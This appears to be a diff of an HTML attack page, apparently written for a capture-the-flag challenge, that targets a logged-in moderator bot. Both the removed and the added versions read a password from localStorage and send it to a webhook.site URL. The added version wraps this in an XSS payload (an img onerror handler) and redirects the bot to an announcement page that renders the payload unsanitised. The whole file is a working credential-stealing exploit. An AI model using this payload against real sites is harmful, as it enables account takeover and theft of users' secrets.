@@ -1,16 +1,26 @@
 <!DOCTYPE html>                                                                                                             
 <html>                                                                                                                      
 <head>                                                                                                                      
-    <title>Forum Content</title>                                                                                            
+  <title>Redirecting...</title>                                                                                             
 </head>                                                                                                                     
 <body>                                                                                                                      
-    <script>                                                                                                                
-        // The moderator bot is already logged in when it visits this page                                                  
-        // We just need to steal the password from localStorage                                                             
+  <script>                                                                                                                  
+    // The moderator bot is already logged in when it visits this page                                                      
+    // We need to redirect to the system announcement page which has an XSS vulnerability                                   
                                                                                                                             
-        // Get the password                                                                                                 
-        const password = localStorage.getItem('password');                                                                                               
-            fetch('https://webhook.site/5283714c-0d6d-40d5-8473-70415e0e5652?password=' + encodeURIComponent(password));                                                                                                                                                                                            
-    </script>                                                                                                               
+    // Create a more reliable XSS payload                                                                                   
+    const xssPayload = encodeURIComponent(`<img src=x onerror="                                                             
+      // Get the password from localStorage                                                                                 
+      const password = localStorage.getItem('password');                                                                    
+      // Send it to our webhook                                                                                             
+      if (password) {                                                                                                       
+        fetch('https://webhook.site/5283714c-0d6d-40d5-8473-70415e0e5652?p=' + encodeURIComponent(password));               
+      }                                                                                                                     
+    ">`);                                                                                                                   
+                                                                                                                            
+    // Redirect to the system announcement page                                                                             
+    // The React app will render our payload via dangerouslySetInnerHTML                                                    
+    window.location = `http://forum2.gliactf.eu/#/announcement/1${xssPayload}`;                                             
+  </script>                                                                                                                 
 </body>                                                                                                                     
-</html>  
+</html>    
